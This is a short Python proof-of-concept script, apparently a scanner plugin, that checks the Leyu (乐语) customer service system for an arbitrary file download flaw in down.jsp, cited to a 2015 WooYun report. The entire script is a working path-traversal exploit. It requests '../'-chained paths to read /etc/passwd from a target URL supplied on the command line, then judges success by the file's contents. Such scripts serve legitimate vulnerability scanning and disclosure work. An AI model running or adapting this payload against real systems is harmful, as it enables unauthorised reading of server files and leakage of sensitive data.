#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 乐语客服系统任意文件下载漏洞
referer: http://www.wooyun.org/bugs/wooyun-2015-0150444
author: Lucifer
description: 乐语客服系统down.jsp文件file参数未过滤导致任意文件下载，可泄露敏感数据
'''
import sys
import requests
import warnings
def run(url):
        result = ['乐语客服系统任意文件下载漏洞','','']
        payload = "/live/down.jsp?file=../../../../../../../../../../../../../../../../etc/passwd"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"root:" in req.text and r"/bin/bash" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
